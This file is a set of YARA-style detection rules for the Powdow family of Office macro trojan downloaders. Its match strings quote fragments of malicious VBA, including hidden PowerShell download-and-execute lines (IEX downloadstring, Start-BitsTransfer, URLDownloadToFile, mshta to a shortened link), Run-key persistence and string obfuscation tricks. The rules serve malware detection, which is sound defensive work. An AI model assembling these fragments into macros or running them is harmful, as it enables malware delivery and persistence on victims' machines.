rule TrojanDownloader_O97M_Powdow_AR_2147753517_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.AR!MTB"
        threat_id = "2147753517"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Shell \"p\" & \"i\" & \"n\" & \"g\"" ascii //weight: 1
        $x_10_2 = {53 68 65 6c 6c 20 53 74 72 52 65 76 65 72 73 65 28 22 [0-30] 26 20 22 2e 22 20 26 20 22 6a 5c 5c 3a 73 22 20 26 20 22 70 74 74 68 22 [0-15] 61 22 20 26 20 22 74 22 20 26 20 22 68 22 20 26 20 22 73 22 20 26 20 22 6d 22 20 26 20 22 22 22 22 29}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_AR_2147753517_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.AR!MTB"
        threat_id = "2147753517"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = ".Run \"powershell -Sta -Nop -Window Hidden -EncodedCommand" ascii //weight: 1
        $x_1_3 = "AHAAOgAvAC8AMQAwAC4AOAAuADAALgA3ADAALwBIAFQAVABQAG0AbwAuAHAAcwAxACcAKQA=\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_AR_2147753517_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.AR!MTB"
        threat_id = "2147753517"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "30"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "= GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\default:StdRegProv\")" ascii //weight: 10
        $x_10_2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" ascii //weight: 10
        $x_10_3 = "= \"m\" + \"s\" + \"h\" + \"t\" + \"a\" + \" \" + \"h\" + \"t\" + \"t\" + \"ps:\\\\bit.ly/ojqijy52fl19aplw4Tw" ascii //weight: 10
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_AR_2147753517_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.AR!MTB"
        threat_id = "2147753517"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "13"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "path = Environ(\"USERPROFILE\")" ascii //weight: 1
        $x_1_2 = {70 61 74 68 20 3d 20 70 61 74 68 20 26 20 22 [0-9] 2e 74 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = {6f 75 74 70 75 74 20 3d 20 53 70 6c 69 74 28 [0-15] 2c 20 22 26}  //weight: 1, accuracy: Low
        $x_1_4 = "save2file = path" ascii //weight: 1
        $x_1_5 = "path = save2file()" ascii //weight: 1
        $x_10_6 = {3d 20 22 63 6d 64 20 2f 63 20 63 64 20 2f 64 20 25 55 53 45 52 50 52 4f 46 49 4c 45 25 20 26 26 20 72 65 6e 20 [0-9] 2e 74 78 74 20 00 2e 65 78 65 20 26 26 [0-9] 68 74 74 70 3a 2f 2f}  //weight: 10, accuracy: Low
        $x_1_7 = {3d 20 53 68 65 6c 6c 28 [0-15] 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Powdow_AR_2147753517_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.AR!MTB"
        threat_id = "2147753517"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "21"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "outFile = \"C:\\programdata\\803d76071.aaa\"" ascii //weight: 10
        $x_10_2 = "Get-Content .\\803d76071.aaa;$filename = 'c:\\programdata\\803d76071.exe';$bytes = [Convert]::FromBase64String" ascii //weight: 10
        $x_10_3 = "outFile = \"C:\\programdata\\aaa.ps1\"" ascii //weight: 10
        $x_1_4 = "echo|set /p=\"\"powershel\"\">>C:\\programdata\\" ascii //weight: 1
        $x_1_5 = "Set File = fso.CreateTextFile(outFile, True)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_10_*) and 1 of ($x_1_*))) or
            ((3 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Powdow_AR_2147753517_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.AR!MTB"
        threat_id = "2147753517"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "25"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = "d2lubWdtdHM6d2luMzJfUHJvY2Vzcw==" ascii //weight: 5
        $x_5_2 = "cG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAgLWNvbW1hbmQgIiAmIHsgaXdyIGh0dHA6Ly8" ascii //weight: 5
        $x_10_3 = "LmpwZyAtT3V0RmlsZSBDOlxVc2Vyc1xQdWJsaWNc" ascii //weight: 10
        $x_10_4 = {4c 6d 56 34 5a 58 30 37 49 43 59 67 65 31 4e 30 59 58 4a 30 4c 56 42 79 62 32 4e 6c 63 33 4d 67 4c 55 5a 70 62 47 56 51 59 58 52 6f 49 43 4a 44 4f 6c 78 56 63 32 56 79 63 31 78 51 64 57 4a 73 61 57 4e 63 55 47 6c 6a 64 48 56 79 5a 58 4e 63 [0-20] 4c 6d 56 34 5a 53 4a 39 49 67}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_10_*) and 1 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Powdow_AR_2147753517_8
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.AR!MTB"
        threat_id = "2147753517"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "43"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {22 20 2b 20 5f 0d 0a 22}  //weight: 10, accuracy: High
        $x_10_2 = "GetObject(StrReverse(\"ss\" + \"ec\" + \"orP_\" + \"23niW\" + \":2\" + \"vmi\" + \"c\\t\" + \"oor:\" + \"stm\" + \"gm\" + \"n\" + \"iw\"))" ascii //weight: 10
        $x_10_3 = "Create(StrReverse(" ascii //weight: 10
        $x_10_4 = "e- ne\" + \"ddi\" + \"h ely\" + \"tswodn\" + \"iw- l\" + \"leh\" + \"sr\" + \"e\" + \"w\" + \"op\")," ascii //weight: 10
        $x_1_5 = "MsgBox (\"?????????????????????\" &" ascii //weight: 1
        $x_1_6 = "Call FilePath" ascii //weight: 1
        $x_1_7 = "Call CreateFile" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_AV_2147753574_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.AV!MTB"
        threat_id = "2147753574"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ll.Application\").Open" ascii //weight: 1
        $x_1_2 = "-w h Start-BitsTransfer -Source htt`p://qdyhygm.com/wp-content/plugins/masterx/fRTnsoles3.e`xe\" & \" -Destination C:\\Users\\Public\\Documents\\yesthousand.e`xe" ascii //weight: 1
        $x_1_3 = "C:\\Users\\Public\\Documents\\differencedata.bat" ascii //weight: 1
        $x_1_4 = "hell" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_AV_2147753574_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.AV!MTB"
        threat_id = "2147753574"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= GetObject(\"winmgmts:\\\\.\\root\\cimv2:Win32_Process\")" ascii //weight: 1
        $x_1_2 = "= objWMIService.Get(\"Win32_ProcessStartup\")" ascii //weight: 1
        $x_1_3 = "= \"powershell -noP -sta -w 1 -enc" ascii //weight: 1
        $x_1_4 = "= system(\"echo \"\"import sys,base64;exec(base64.b64decode(\\\"\" \" & Str & \" \\\"\"));\"\" | /usr/bin/python &\")" ascii //weight: 1
        $x_1_5 = "= \"http://127.0.0.1/tracking?source=\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_GM_2147753687_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.GM!MTB"
        threat_id = "2147753687"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "prm = bfhdg37drt3t(\"!U0!Z!E0!O0!Z!D0!fdjpid!D0!\")" ascii //weight: 1
        $x_1_2 = "tmps = bfhdg37drt3t(\"tqnu]sjeqnu]dj\" & \"mcvQ]tsftV];D\")" ascii //weight: 1
        $x_1_3 = "ct = DateDiff(\"s\", \"1/1/1970\", Date + Time)" ascii //weight: 1
        $x_1_4 = "Attribute VB_Name =" ascii //weight: 1
        $x_1_5 = "Declare Sub GoodNight Lib \"kernel32\" Alias \"Sleep\" (ByVal milliseconds As Long)" ascii //weight: 1
        $x_1_6 = "Dim tmps As String" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DX_2147754374_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DX!MTB"
        threat_id = "2147754374"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Private Declare PtrSafe Function URLDownloadToFile Lib \"urlmon\" _" ascii //weight: 1
        $x_1_2 = "//:ptth\"," ascii //weight: 1
        $x_1_3 = {28 22 61 70 70 64 61 74 61 22 29 20 26 20 22 5c [0-2] 2e 74 6d 70 22}  //weight: 1, accuracy: Low
        $x_1_4 = {43 61 6c 6c 20 [0-2] 2e [0-2] 28 53 74 72 52 65 76 65 72 73 65 28 22 20 32 33 72 76 73 67 65 72 22 29 20 2b}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 28 30 26 2c 20 53 74 72 52 65 76 65 72 73 65 28 [0-2] 29 2c 20 [0-2] 2c 20 [0-2] 26 2c 20 [0-2] 26 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_6 = {44 69 6d 20 [0-3] 20 41 73 20 4e 65 77 20 57 73 68 53 68 65 6c 6c [0-5] 2e 65 78 65 63}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SA_2147754399_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SA!MTB"
        threat_id = "2147754399"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "http://maringareservas.com.br/" ascii //weight: 1
        $x_1_2 = {53 68 65 6c 6c 20 45 6e 76 69 72 6f 6e 24 28 22 43 4f 4d 53 50 45 43 22 29 20 26 [0-121] 6c 6f 63 61 6c 68 6f 73 74 20 26 20 22 20 26 20 50 53 68 65 6c 6c 43 6f 64 65 2c 20 76 62 48 69 64 65}  //weight: 1, accuracy: Low
        $x_1_3 = "Sub Workbook_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SA_2147754399_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SA!MTB"
        threat_id = "2147754399"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "maisdmasid = StrReverse(SReverseMod(\"p/.m@j480923%1480923/1:/tpht \"))" ascii //weight: 1
        $x_1_2 = "kaksmd9asdm = " ascii //weight: 1
        $x_1_3 = "xmorgandd = StrReverse(SReverseMod(\"ngpi\"))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_AZ_2147754470_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.AZ!MTB"
        threat_id = "2147754470"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 75 62 6c 69 63 20 53 75 62 20 74 6c 74 6c 74 6c 28 29 02 00 53 68 65 65 74 33 2e 6a 68 6a 68 6a 68}  //weight: 1, accuracy: Low
        $x_1_2 = "Sheet2.tltltl" ascii //weight: 1
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 2e 52 65 67 57 72 69 74 65 20 22 48 4b 43 55 5c 53 6f 66 74 77 61 72 65 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 43 75 72 72 65 6e 74 56 65 72 73 69 6f 6e 5c 52 75 6e 4f 6e 63 65 5c [0-37] 22 2c 20 22 22 22 6d 22 20 2b 20 22 73 22 20 2b 20 22 68 22 20 2b 20 22 74 22 20 2b 20 22 61 22 22 22 22 68 74 74 70 3a 5c 5c 6a 2e 6d 70 5c [0-37] 22 22 22 2c 20 22 52 45 47 5f 53 5a 22}  //weight: 1, accuracy: Low
        $x_1_4 = {53 68 65 65 74 31 2e 6a 6a 6a 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BB_2147754733_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BB!MTB"
        threat_id = "2147754733"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(Replace(\"W`7cript.`7hell\", \"`7\", \"s\"))" ascii //weight: 1
        $x_1_2 = "= Replace(\"pow`7rsh`7ll \", \"`7\", \"e\")" ascii //weight: 1
        $x_1_3 = "H1H9.Run (H4H6 + H2H6), 0, True" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BB_2147754733_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BB!MTB"
        threat_id = "2147754733"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(Replace(\"W^^cript.^^hell\", \"^^\", \"s\"))" ascii //weight: 1
        $x_1_2 = "H8H7 = Replace(\"pow^^rsh^^ll \", \"^^\", \"e\")" ascii //weight: 1
        $x_1_3 = "H8H2.Run (H8H7 + H2H2), 0, True" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BB_2147754733_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BB!MTB"
        threat_id = "2147754733"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-12] 2c 20 [0-12] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = "= soIfx18n(UserForm1.Label1.Caption)" ascii //weight: 1
        $x_1_3 = ".Environment(\"process\").Item(\"param1\") =" ascii //weight: 1
        $x_1_4 = ".run \"cmd /c call %param1%\", 2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BB_2147754733_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BB!MTB"
        threat_id = "2147754733"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-12] 2c 20 [0-12] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = "= wZjThH7x(UserForm1.Label1.Caption)" ascii //weight: 1
        $x_1_3 = ".Environment(\"process\").Item(\"param1\") =" ascii //weight: 1
        $x_1_4 = ".run \"cmd /c call %param1%\", 2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BB_2147754733_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BB!MTB"
        threat_id = "2147754733"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"C:\\Users\\Public\\Documents\\god.\" &" ascii //weight: 1
        $x_1_2 = {2e 57 72 69 74 65 4c 69 6e 65 20 [0-20] 20 26 20 [0-20] 20 26 20 22 20 2d 77 20 68 69 20 73 6c 5e 65 65 70 20 2d 53 65 20 33 31 3b 53 74 61 5e 72 74 2d 42 69 74 73 54 72 5e 61 6e 73 5e 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74}  //weight: 1, accuracy: Low
        $x_1_3 = "Dest C:\\Users\\Public\\Documents\\bornexist.e`xe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BB_2147754733_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BB!MTB"
        threat_id = "2147754733"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell (\"powershell.exe c:\\temp\\spool.exe\")" ascii //weight: 1
        $x_1_2 = "Shell (\"powershell.exe mkdir c:\\temp\")" ascii //weight: 1
        $x_1_3 = "DownloadFile = URLDownloadToFile(0&, sSourceUrl, sLocalFile, BINDF_GETNEWESTVERSION, 0&)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BB_2147754733_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BB!MTB"
        threat_id = "2147754733"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".createElement(\"b64\")" ascii //weight: 1
        $x_1_2 = {28 53 74 72 52 65 76 65 72 73 65 28 22 70 6d 65 74 22 29 29 20 26 20 22 5c [0-5] 2e 74 6d 70 22}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 44 61 74 61 54 79 70 65 20 3d 20 22 62 69 6e 2e 62 61 73 65 36 34 22 02 00 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 43 72 65 61 74 65 20 [0-8] 28 29 20 2b 20 22 20 22 20 2b}  //weight: 1, accuracy: Low
        $x_1_5 = "Alias \"URLDownloadToFileA\" ( _" ascii //weight: 1
        $x_1_6 = {3d 20 56 42 41 2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-3] 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BC_2147754989_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BC!MTB"
        threat_id = "2147754989"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 44 61 74 61 54 79 70 65 20 3d 20 22 62 69 6e 2e 62 61 73 65 36 34 22 02 00 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_2 = ".createElement(\"b64\")" ascii //weight: 1
        $x_1_3 = "Alias \"URLDownloadToFileA\" ( _" ascii //weight: 1
        $x_1_4 = {28 53 74 72 52 65 76 65 72 73 65 28 22 70 6d 74 22 29 29 20 26 20 22 5c [0-5] 2e 74 6d 70 22}  //weight: 1, accuracy: Low
        $x_1_5 = {44 69 6d 20 61 72 72 28 [0-2] 20 54 6f 20 [0-2] 29 02 00 61 72 72 28 [0-2] 29 20 3d}  //weight: 1, accuracy: Low
        $x_1_6 = {2e 43 72 65 61 74 65 20 [0-3] 2e [0-4] 28 29 20 2b 20 22 20 22 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BD_2147755033_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BD!MTB"
        threat_id = "2147755033"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 45 6c 65 6d 65 6e 74 28 22 62 61 73 65 36 34 22 29 [0-21] 2e 64 61 74 61 54 79 70 65 20 3d 20 22 62 69 6e 2e 62 61 73 65 36 34 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2b 20 53 74 72 52 65 76 28 22 [0-21] 22 29 [0-21] 20 3d 20 [0-18] 20 2b 20 53 74 72 52 65 76 28 22}  //weight: 1, accuracy: Low
        $x_1_3 = "= Replace(\"C###:\\###Win###do###ws\\###Micr###osof###t.NET\\Fr###amewo###rk\\\", \"###\", \"\")" ascii //weight: 1
        $x_1_4 = "= Replace(\"\\###ms###bu###ild.###exe\", \"###\", \"\")" ascii //weight: 1
        $x_1_5 = {4e 65 78 74 [0-5] 53 74 72 52 65 76 20 3d 20 52 65 76 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PRB_2147755169_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PRB!MTB"
        threat_id = "2147755169"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"powershell.exe \"\"IEX ((new-ob\" & \"ject net.webclient).downloadstring('http://10.0.0.13/payload.txt'))\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_AJ_2147755529_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.AJ!MTB"
        threat_id = "2147755529"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 75 6e 63 74 69 6f 6e 20 6f 64 6f 78 28 29 [0-5] 6f 64 6f 78 20 3d 20 22 68 74 74 70 3a 2f 2f 22}  //weight: 1, accuracy: Low
        $x_1_2 = "URLDownloadToFile 0, odox()" ascii //weight: 1
        $x_1_3 = "xzng9zrcihtm9jfs.com/w1kbs7qffwr3g5nn/hz1704i8k8bwhyo1.php?l=kywt9.cab\"," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

